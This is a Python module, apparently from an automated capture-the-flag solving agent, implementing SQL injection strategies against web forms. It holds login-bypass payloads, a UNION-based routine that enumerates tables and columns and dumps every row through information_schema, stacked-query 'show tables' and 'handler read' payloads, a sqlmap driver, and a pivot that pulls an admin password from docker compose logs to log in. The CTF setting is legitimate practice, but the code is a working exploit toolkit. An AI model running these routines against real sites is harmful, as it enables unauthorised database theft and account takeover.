"""SQLi strategy executor extracted from ctf_dispatcher.py.

P5 / sixteenth cut: the SQLi strategy cluster (5 methods, ~494 lines) is
physically moved out of CTFTaskDispatcher into a behaviour-preserving
mixin — unicode numeric-form bypass, auth-form SQLi bypass, sqlmap driver,
generic GET-parameter stacked-query SQLi, and the local-challenge
compose-logs credential pivot.

The only top-level constant the cluster touches, ``_SQLI_AUTH_BYPASS_PAYLOADS``,
is used solely here, so it travels with the cluster into this module (no
sinking to dispatcher_helpers). Every other module-level symbol is already
exported from acyclic modules: the form / sqlmap / local-challenge helpers
from ``dispatcher_helpers``, ``find_auth_form`` from ``ctf_planner``,
``_ChainOutcome`` from ``chains.base``; ``run_sqlmap`` stays a method-local
dynamic import. All ``self.*`` access resolves at runtime via the MRO of the
dispatcher that mixes this in — including the shared ``_submit_form_request``
(kept on the dispatcher in the fourteenth cut), ``_extract_flag`` /
``_extract_php_var_dump_strings`` (FlagParserMixin), ``_observe_flag``
(FlagObserverMixin), ``_store_note`` / ``_store_secret_note``
(NoteStoreMixin), ``_resolve_registered_local_challenge_paths``
(AuditInfraMixin) and the dispatcher-resident ``_scan_and_store`` /
``_emit`` / ``_recent_local_source_hint_routes`` / ``_fetch_admin_with_sid``.
Call sites unchanged. Pure code relocation, near-zero risk.
"""

from __future__ import annotations

import json
import re
from typing import Any
from urllib.parse import urljoin, urlparse

from .chains.base import _ChainOutcome
from .ctf_planner import find_auth_form
from .dispatcher_helpers import (
    _base_target,
    _build_sqlmap_target_from_form,
    _docker_compose_logs_command,
    _extract_admin_password_from_logs,
    _extract_local_challenge_root,
    _extract_sid_from_login_response,
    _looks_like_successful_auth_change,
    _pick_form_field,
    _quote_sql_identifier,
    _resolve_auth_login_url,
    _resolve_compose_file,
)

_SQLI_AUTH_BYPASS_PAYLOADS = (
    "1' or 1=1#",
    "admin' or '1'='1' -- -",
    "' or 1=1#",
)

# UNION-based extraction (LoveSQL-class login forms whose flag lives in a table
# column, not shown on login). Every dumped value is wrapped in this marker so it
# can be regex-recovered from any page template regardless of surrounding HTML.
_SQLI_UNION_MARKER = "<<FHU>>"
_SQLI_UNION_MARKER_HEX = "0x3c3c4648553e3e"  # hex("<<FHU>>")
_SQLI_UNION_MAX_COLUMNS = 8
_SQLI_UNION_SENTINEL_BASE = 918200  # distinctive ints unlikely to occur naturally


class SQLiExecutorMixin:
    """Unicode/auth/sqlmap/generic SQLi strategies and the local-challenge log pivot."""

    async def _run_unicode_numeric_form_bypass_strategy(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        forms = list(page_features.get("forms") or [])
        candidate_form = None
        for form in forms:
            if not isinstance(form, dict):
                continue
            input_names = {
                str(item.get("name") or "").strip().lower()
                for item in (form.get("inputs") or [])
                if isinstance(item, dict) and str(item.get("name") or "").strip()
            }
            action = str(form.get("action") or "").strip().lower()
            if {"id", "price"}.issubset(input_names) and ("/charge" in action or action.endswith("charge")):
                candidate_form = form
                break

        if candidate_form is None:
            for form in forms:
                if not isinstance(form, dict):
                    continue
                input_names = {
                    str(item.get("name") or "").strip().lower()
                    for item in (form.get("inputs") or [])
                    if isinstance(item, dict) and str(item.get("name") or "").strip()
                }
                if {"id", "price"}.issubset(input_names):
                    candidate_form = form
                    break

        if candidate_form is None:
            return _ChainOutcome(progress=False, reason="unicode numeric bypass: purchase form not found")

        strategy_kind = "unicode_numeric_form_bypass"
        action_url = str(candidate_form.get("action") or "").strip() or target
        if not action_url:
            action_url = target
        action_url = urljoin(target if target.endswith("/") else target + "/", action_url)

        baseline_fields = {"id": "4", "price": "1"}
        baseline_resp, _ = await self._submit_form_request(target, candidate_form, baseline_fields)
        baseline_body = str((baseline_resp or {}).get("body") or "")
        baseline_status = int((baseline_resp or {}).get("status_code") or 0)
        await self._scan_and_store(baseline_body, action_url, evidence_source="http-response", page_features=page_features)
        if self.state is not None and baseline_body:
            self.state.add_observation(
                "unicode_numeric_baseline",
                baseline_body[:240],
                source=strategy_kind,
                metadata={
                    "strategy_kind": strategy_kind,
                    "url": action_url,
                    "status_code": baseline_status,
                    "fields": dict(baseline_fields),
                },
            )

        progress = bool(baseline_body)
        failure_markers = ("not enough money", "only one char", "one char", "余额", "money")
        if baseline_body and any(marker in baseline_body.lower() for marker in failure_markers):
            progress = True

        candidate_payloads = ("万", "萬", "፼", "ↈ")
        reasons: list[str] = []
        baseline_lower = baseline_body.lower()
        for payload in candidate_payloads:
            attempt_fields = {"id": "4", "price": payload}
            response, request_url = await self._submit_form_request(
                target,
                candidate_form,
                attempt_fields,
            )
            body = str((response or {}).get("body") or "")
            status_code = int((response or {}).get("status_code") or 0)
            await self._scan_and_store(body, request_url, evidence_source="http-response", page_features=page_features)
            if self.state is not None and body:
                self.state.add_observation(
                    "unicode_numeric_probe",
                    body[:240],
                    source=strategy_kind,
                    metadata={
                        "strategy_kind": strategy_kind,
                        "url": request_url,
                        "status_code": status_code,
                        "fields": dict(attempt_fields),
                        "payload": payload,
                    },
                )

            self._emit(f"[CTF dispatcher] unicode numeric probe price={payload!r} -> {request_url}")

            if extracted_flag := self._extract_flag(body):
                verification = await self._observe_flag(
                    extracted_flag,
                    target,
                    evidence_source="http-response",
                    rationale=f"unicode numeric form bypass via price={payload}",
                    evidence_url=request_url,
                    evidence_snippet=body[:240],
                    strategy_kind=strategy_kind,
                )
                if verification.decision in {"verified", "runtime"}:
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason=f"unicode numeric form bypass via price={payload}",
                    )
                progress = True
                reasons.append(f"unicode numeric payload {payload} produced {verification.decision} flag")
                continue

            lowered = body.lower()
            if body and lowered != baseline_lower:
                progress = True
                reasons.append(f"unicode numeric payload {payload} changed response")

        return _ChainOutcome(
            progress=progress,
            reason="; ".join(reasons) if reasons else "unicode numeric payloads exhausted",
        )

    async def _attempt_auth_form_sqli(
        self,
        target: str,
        auth_form: dict[str, Any],
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        username_field = _pick_form_field(auth_form, "username")
        password_field = _pick_form_field(auth_form, "password")
        if not username_field or not password_field:
            return _ChainOutcome(progress=False, reason="auth form fields incomplete")

        baseline_fields = {
            username_field: "ctf_probe_user",
            password_field: "ctf_probe_pass",
        }
        baseline_resp, _ = await self._submit_form_request(
            target, auth_form, baseline_fields
        )
        baseline_body = str((baseline_resp or {}).get("body") or "")
        await self._scan_and_store(baseline_body, target, evidence_source="http-response")
        progress = bool(baseline_body)
        reasons: list[str] = []

        for payload in _SQLI_AUTH_BYPASS_PAYLOADS:
            attempt_fields = {
                username_field: payload,
                password_field: "1",
            }
            response, request_url = await self._submit_form_request(
                target, auth_form, attempt_fields
            )
            body = str((response or {}).get("body") or "")
            await self._scan_and_store(body, target, evidence_source="http-response")
            self._emit(
                f"[CTF dispatcher] SQLi auth probe {username_field}={payload!r} -> {request_url}"
            )
            extracted_flag = self._extract_flag(body)
            if extracted_flag:
                verification = await self._observe_flag(
                    extracted_flag,
                    target,
                    evidence_source="http-response",
                    rationale="auth form SQLi bypass",
                    evidence_url=request_url,
                    evidence_snippet=body[:240],
                    strategy_kind="auth_form_sqli",
                )
                # Mirror _attempt_generic_param_sqli: surface the flag on both
                # "verified" and "runtime" decisions. A live-exploit flag that
                # literally appears in the auth-bypass response is a real
                # near-solve; dropping it on "runtime" (as the old `continue`
                # did) loses the win for remote CTF instances that the verifier
                # cannot auto-verify without a prior platform submit.
                if verification.decision in {"verified", "runtime"}:
                    await self._store_note(
                        key="ctf_sqli_auth_bypass",
                        value=f"auth form bypass succeeded via {username_field}={payload}",
                        category="vulnerability",
                        target=urlparse(target).netloc or target,
                        url=request_url,
                        weaknesses=[
                            {
                                "id": "sqli-auth-bypass",
                                "description": "Authentication form accepted a SQL injection login bypass payload.",
                            }
                        ],
                    )
                    # verified ⇒ unconditional solve; runtime ⇒ short-circuit the
                    # sequence and surface the flag (blackboard make_goal reads it from
                    # state.runtime_flags), but mark it unverified so the terminal
                    # contract routes it to wait_for_verification, not a claimed win.
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason="auth form SQLi bypass",
                        verified=verification.decision == "verified",
                    )
                if verification.decision == "candidate":
                    progress = True
                    reasons.append("auth form produced candidate flag")
                    continue

            if _looks_like_successful_auth_change(response, baseline_resp):
                await self._store_note(
                    key="ctf_sqli_auth_signal",
                    value=f"response diverged for payload {payload}",
                    category="finding",
                    target=urlparse(target).netloc or target,
                    url=request_url,
                )
                return _ChainOutcome(
                    progress=True,
                    reason="auth form response changed under SQLi payload",
                )

        fallback_reason = "auth-form probes exhausted"
        if reasons:
            fallback_reason = "; ".join(reasons + [fallback_reason])
        return _ChainOutcome(progress=progress, reason=fallback_reason)

    async def _attempt_auth_form_union_sqli(
        self,
        target: str,
        auth_form: dict[str, Any],
    ) -> _ChainOutcome:
        """UNION-based extraction on a login form (LoveSQL-class).

        ``_attempt_auth_form_sqli`` only *logs in* — for challenges whose flag lives
        in a table column (never shown on the login page) the flag is recovered by a
        ``UNION SELECT`` that reflects a dumped value into the response. This is the
        missing POST-login UNION extraction vector: the bypass strategy does login,
        ``generic_param_sqli`` does GET-form stacked queries (``handler read``), and
        neither dumps a login form's database via UNION. The live LoveSQL stress run
        exposed the gap — 24 steps, zero UNION payloads, unsolved.

        Deterministic bounded schema walk: discover the UNION column count and a
        reflected position, then dump tables -> columns -> row data via
        ``group_concat``, wrapping every extracted value in a distinctive marker so it
        can be regex-recovered from any page template. Each blob is flag-scanned; a
        verified/runtime flag is surfaced exactly like the bypass strategy (returned on
        "runtime" too, per efd6188), with ``strategy_kind`` set for memory attribution.
        """
        self.tool_guard.require(["http_request"])
        username_field = _pick_form_field(auth_form, "username")
        password_field = _pick_form_field(auth_form, "password")
        if not username_field:
            return _ChainOutcome(
                progress=False, reason="auth form union: no injectable username field"
            )

        progress = False
        reasons: list[str] = []

        async def _submit(payload: str) -> tuple[str, str]:
            fields = {username_field: payload}
            if password_field:
                fields[password_field] = "1"
            response, url = await self._submit_form_request(target, auth_form, fields)
            body = str((response or {}).get("body") or "")
            await self._scan_and_store(body, url, evidence_source="http-response")
            return body, url

        async def _check_flag(body: str, url: str, note: str) -> _ChainOutcome | None:
            extracted = self._extract_flag(body)
            if not extracted:
                return None
            verification = await self._observe_flag(
                extracted,
                target,
                evidence_source="http-response",
                rationale=f"auth form UNION SQLi: {note}",
                evidence_url=url,
                evidence_snippet=body[:240],
                strategy_kind="auth_form_union_sqli",
            )
            if verification.decision in {"verified", "runtime"}:
                await self._store_note(
                    key="ctf_sqli_union_extract",
                    value=f"UNION extraction recovered flag via {username_field} ({note})",
                    category="vulnerability",
                    target=urlparse(target).netloc or target,
                    url=url,
                    weaknesses=[
                        {
                            "id": "sqli-union",
                            "description": "UNION-based SQL injection recovered database contents.",
                        }
                    ],
                )
                return _ChainOutcome(
                    progress=True,
                    flag=verification.flag,
                    reason="auth form UNION SQLi",
                    verified=verification.decision == "verified",
                )
            return None

        # 1) Column count + reflected positions: grow the SELECT list until the row's
        #    integer sentinels surface in the response (a correct column count no longer
        #    errors, and the union row is rendered where the login result would be).
        columns = 0
        reflected: list[int] = []
        for n in range(2, _SQLI_UNION_MAX_COLUMNS + 1):
            sentinels = [str(_SQLI_UNION_SENTINEL_BASE + i) for i in range(n)]
            body, _url = await _submit("-1' union select " + ",".join(sentinels) + "#")
            hit = [i + 1 for i, s in enumerate(sentinels) if s in body]
            if hit:
                columns, reflected, progress = n, hit, True
                reasons.append(f"union column count = {n}, reflected positions {hit}")
                break

        if not columns or not reflected:
            return _ChainOutcome(
                progress=progress,
                reason="; ".join(reasons + ["auth form union: no reflected UNION column found"]),
            )

        pos = reflected[0]  # 1-indexed reflected position we hijack for extraction

        def _build(expr: str) -> str:
            wrapped = f"concat({_SQLI_UNION_MARKER_HEX},({expr}),{_SQLI_UNION_MARKER_HEX})"
            cells = [
                wrapped if (i + 1) == pos else str(_SQLI_UNION_SENTINEL_BASE + i)
                for i in range(columns)
            ]
            return "-1' union select " + ",".join(cells) + "#"

        marker = re.escape(_SQLI_UNION_MARKER)

        def _extract_marked(body: str) -> str:
            match = re.search(marker + r"(.*?)" + marker, body, re.DOTALL)
            return match.group(1) if match else ""

        # 2) Dump the current database's tables.
        body, url = await _submit(
            _build(
                "select group_concat(table_name) from information_schema.tables "
                "where table_schema=database()"
            )
        )
        if hit_outcome := await _check_flag(body, url, "table dump"):
            return hit_outcome
        tables = [
            t
            for t in _extract_marked(body).split(",")
            if re.fullmatch(r"[A-Za-z0-9_]+", t or "")
        ]
        if tables:
            progress = True
            reasons.append(f"union dumped tables: {', '.join(tables[:4])}")
            await self._store_note(
                key="ctf_sqli_union_tables",
                value=json.dumps({"tables": tables[:10]}, ensure_ascii=False),
                category="finding",
                target=urlparse(target).netloc or target,
                url=url,
            )

        def _table_rank(name: str) -> tuple[bool, str]:
            low = name.lower()
            interesting = any(
                tok in low
                for tok in ("flag", "key", "secret", "love", "user", "ctf", "sql", "geek")
            )
            return (not interesting, name)

        # 3+4) Per table: dump its columns, then group_concat all columns of every row
        #       and flag-scan the blob.
        for table in sorted(tables, key=_table_rank)[:4]:
            table_hex = "0x" + table.encode().hex()
            body, url = await _submit(
                _build(
                    "select group_concat(column_name) from information_schema.columns "
                    f"where table_schema=database() and table_name={table_hex}"
                )
            )
            if hit_outcome := await _check_flag(body, url, f"column dump {table}"):
                return hit_outcome
            cols = [
                c
                for c in _extract_marked(body).split(",")
                if re.fullmatch(r"[A-Za-z0-9_]+", c or "")
            ]
            if not cols:
                continue
            concat_cols = ",".join(
                f"ifnull({_quote_sql_identifier(c)},0x20)" for c in cols
            )
            body, url = await _submit(
                _build(
                    f"select group_concat(concat_ws(0x7e,{concat_cols})) "
                    f"from {_quote_sql_identifier(table)}"
                )
            )
            if hit_outcome := await _check_flag(body, url, f"row dump {table}"):
                return hit_outcome
            progress = True
            reasons.append(f"union dumped rows from {table}")

        fallback = "auth form union: extraction exhausted without flag"
        return _ChainOutcome(
            progress=progress,
            reason="; ".join(reasons + [fallback]) if reasons else fallback,
        )

    async def _attempt_sqlmap_sqli(
        self,
        target: str,
        *,
        auth_form: dict[str, Any] | None = None,
    ) -> _ChainOutcome:
        self.tool_guard.require(["sqlmap"])
        try:
            from ...tools.sqlmap import run_sqlmap
        except Exception as exc:
            return _ChainOutcome(progress=False, reason=f"sqlmap tool unavailable: {exc}")

        sqlmap_url = target
        sqlmap_data = ""

        if auth_form:
            sqlmap_url, sqlmap_data = _build_sqlmap_target_from_form(target, auth_form)

        result = await run_sqlmap(
            url=sqlmap_url,
            data=sqlmap_data,
            level=1,
            risk=1,
            runtime=self.runtime,
        )
        raw = str(result.get("raw") or "")
        await self._scan_and_store(raw, target, evidence_source="command-output")

        if result.get("error"):
            return _ChainOutcome(progress=False, reason=str(result["error"]))

        vulnerable = bool(result.get("vulnerable"))
        injection_points = result.get("injection_points") or []
        databases = result.get("databases") or []
        if vulnerable or injection_points or databases:
            await self._store_note(
                key="ctf_sqli_sqlmap",
                value=json.dumps(
                    {
                        "url": sqlmap_url,
                        "data": sqlmap_data,
                        "vulnerable": vulnerable,
                        "injection_points": injection_points[:3],
                        "databases": databases[:10],
                    },
                    ensure_ascii=False,
                ),
                category="finding",
                target=urlparse(target).netloc or target,
                url=sqlmap_url,
            )

        extracted_flag = self._extract_flag(raw)
        if extracted_flag:
            verification = await self._observe_flag(
                extracted_flag,
                target,
                evidence_source="command-output",
                rationale="sqlmap extracted flag",
            )
            if verification.decision == "verified":
                return _ChainOutcome(
                    progress=True,
                    flag=verification.flag,
                    reason="sqlmap extracted flag",
                )

        return _ChainOutcome(
            progress=bool(vulnerable or injection_points or databases),
            reason="sqlmap finished without direct flag",
        )

    async def _attempt_generic_param_sqli(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        forms = [
            form
            for form in (page_features.get("forms") or [])
            if isinstance(form, dict)
            and str(form.get("method") or "GET").strip().upper() == "GET"
        ]
        if not forms:
            return _ChainOutcome(progress=False, reason="generic param sqli: no GET form found")

        candidate_form = None
        candidate_field = ""
        baseline_value = "1"
        for form in forms:
            for item in form.get("inputs") or []:
                if not isinstance(item, dict):
                    continue
                name = str(item.get("name") or "").strip()
                if not name:
                    continue
                field_type = str(item.get("type") or "text").strip().lower()
                if field_type in {"submit", "button", "image", "reset", "hidden"}:
                    continue
                candidate_form = form
                candidate_field = name
                baseline_value = str(item.get("value") or "").strip() or "1"
                break
            if candidate_form is not None:
                break

        if candidate_form is None or not candidate_field:
            return _ChainOutcome(progress=False, reason="generic param sqli: injectable field not found")

        progress = False
        reasons: list[str] = []
        baseline_fields = {candidate_field: baseline_value}
        baseline_resp, _ = await self._submit_form_request(target, candidate_form, baseline_fields)
        baseline_body = str((baseline_resp or {}).get("body") or "")
        await self._scan_and_store(baseline_body, target, evidence_source="http-response")
        progress = progress or bool(baseline_body)

        quote_payload = f"{baseline_value}'"
        quote_resp, quote_url = await self._submit_form_request(
            target,
            candidate_form,
            {candidate_field: quote_payload},
        )
        quote_body = str((quote_resp or {}).get("body") or "")
        await self._scan_and_store(quote_body, quote_url, evidence_source="http-response")
        quote_lower = quote_body.lower()
        if any(marker in quote_lower for marker in ("sql syntax", "error 1064", "mariadb")):
            progress = True
            reasons.append("generic param quote probe triggered SQL error")

        show_tables_payload = f"{baseline_value}';show tables;#"
        tables_resp, tables_url = await self._submit_form_request(
            target,
            candidate_form,
            {candidate_field: show_tables_payload},
        )
        tables_body = str((tables_resp or {}).get("body") or "")
        await self._scan_and_store(tables_body, tables_url, evidence_source="http-response")
        table_names = self._extract_php_var_dump_strings(tables_body)
        table_names = [
            name
            for name in table_names
            if name
            and name not in {baseline_value, "hahahah"}
            and re.fullmatch(r"[A-Za-z0-9_]+", name)
        ]
        table_names = list(dict.fromkeys(table_names))
        if table_names:
            progress = True
            reasons.append(f"stacked query exposed tables: {', '.join(table_names[:3])}")
            await self._store_note(
                key="ctf_sqli_stacked_tables",
                value=json.dumps({"tables": table_names[:10]}, ensure_ascii=False),
                category="finding",
                target=urlparse(target).netloc or target,
                url=tables_url,
            )

        prioritized_tables = sorted(
            table_names,
            key=lambda name: (name == "words", not name.isdigit(), name),
        )
        for table_name in prioritized_tables[:4]:
            quoted_table = _quote_sql_identifier(table_name)
            columns_payload = f"{baseline_value}';show columns from {quoted_table};#"
            columns_resp, columns_url = await self._submit_form_request(
                target,
                candidate_form,
                {candidate_field: columns_payload},
            )
            columns_body = str((columns_resp or {}).get("body") or "")
            await self._scan_and_store(columns_body, columns_url, evidence_source="http-response")
            column_values = self._extract_php_var_dump_strings(columns_body)
            if column_values:
                progress = True
                reasons.append(f"show columns succeeded for {table_name}")
                await self._store_note(
                    key=f"ctf_sqli_columns_{table_name}",
                    value=json.dumps({"table": table_name, "columns": column_values[:12]}, ensure_ascii=False),
                    category="finding",
                    target=urlparse(target).netloc or target,
                    url=columns_url,
                )
            if "flag" not in {value.lower() for value in column_values}:
                continue

            handler_payload = (
                f"{baseline_value}';handler {quoted_table} open;"
                f"handler {quoted_table} read first;#"
            )
            handler_resp, handler_url = await self._submit_form_request(
                target,
                candidate_form,
                {candidate_field: handler_payload},
            )
            handler_body = str((handler_resp or {}).get("body") or "")
            await self._scan_and_store(handler_body, handler_url, evidence_source="http-response")
            if extracted_flag := self._extract_flag(handler_body):
                verification = await self._observe_flag(
                    extracted_flag,
                    target,
                    evidence_source="http-response",
                    rationale=f"stacked query handler read from {table_name}",
                    evidence_url=handler_url,
                    evidence_snippet=handler_body[:240],
                    strategy_kind="generic_param_sqli",
                )
                if verification.decision in {"verified", "runtime"}:
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason=f"stacked query handler read from {table_name}",
                    )
                progress = True
                reasons.append(f"handler read from {table_name} produced {verification.decision} flag")

        return _ChainOutcome(
            progress=progress,
            reason="; ".join(reasons) if reasons else "generic param sqli fallback exhausted",
        )

    async def _attempt_local_challenge_log_pivot(
        self,
        *,
        target: str,
        page_features: dict[str, Any],
        hint: str,
    ) -> _ChainOutcome:
        self.tool_guard.require(["terminal", "http_request"])
        challenge_root, compose_file = self._resolve_registered_local_challenge_paths()
        if compose_file is None:
            challenge_root = _extract_local_challenge_root(hint, self._challenge_context)
            if challenge_root is None:
                return _ChainOutcome(progress=False, reason="")
            compose_file = _resolve_compose_file(challenge_root)
        if compose_file is None:
            return _ChainOutcome(progress=False, reason="")

        auth_form = find_auth_form(page_features.get("forms") or [])
        if not auth_form:
            return _ChainOutcome(progress=False, reason="")
        username_field = _pick_form_field(auth_form, "username")
        password_field = _pick_form_field(auth_form, "password")
        if not username_field or not password_field:
            return _ChainOutcome(progress=False, reason="")
        endpoints = {str(item).strip() for item in (page_features.get("endpoints") or []) if str(item).strip()}
        endpoints.update(self._recent_local_source_hint_routes())
        if "/admin" not in endpoints:
            return _ChainOutcome(progress=False, reason="")

        command = _docker_compose_logs_command(compose_file)
        result = await self.runtime.execute_command(command, timeout=30)
        log_blob = "\n".join(
            part for part in (str(getattr(result, "stdout", "") or ""), str(getattr(result, "stderr", "") or "")) if part
        )
        password = _extract_admin_password_from_logs(log_blob)
        if not password:
            return _ChainOutcome(progress=False, reason="local challenge logs contained no reusable admin credential")

        await self._store_secret_note("admin_password", password, target)
        login_url = _resolve_auth_login_url(
            target=target,
            auth_form=auth_form,
            endpoints=endpoints,
        )
        login_resp = await self.runtime.proxy_action(
            "request",
            method="POST",
            url=login_url,
            data={username_field: "admin", password_field: password},
            timeout=15,
        )
        login_body = str((login_resp or {}).get("body") or "")
        await self._scan_and_store(login_body, target, evidence_source="http-response")
        sid = _extract_sid_from_login_response(login_resp)
        if not sid:
            return _ChainOutcome(progress=False, reason="local challenge log pivot recovered password but no sid")
        await self._store_secret_note("sid", sid, target)
        flag = await self._fetch_admin_with_sid(_base_target(target), sid)
        if flag:
            return _ChainOutcome(progress=True, flag=flag, reason="local challenge log pivot via compose logs")
        return _ChainOutcome(progress=False, reason="local challenge log pivot recovered credential but no flag")
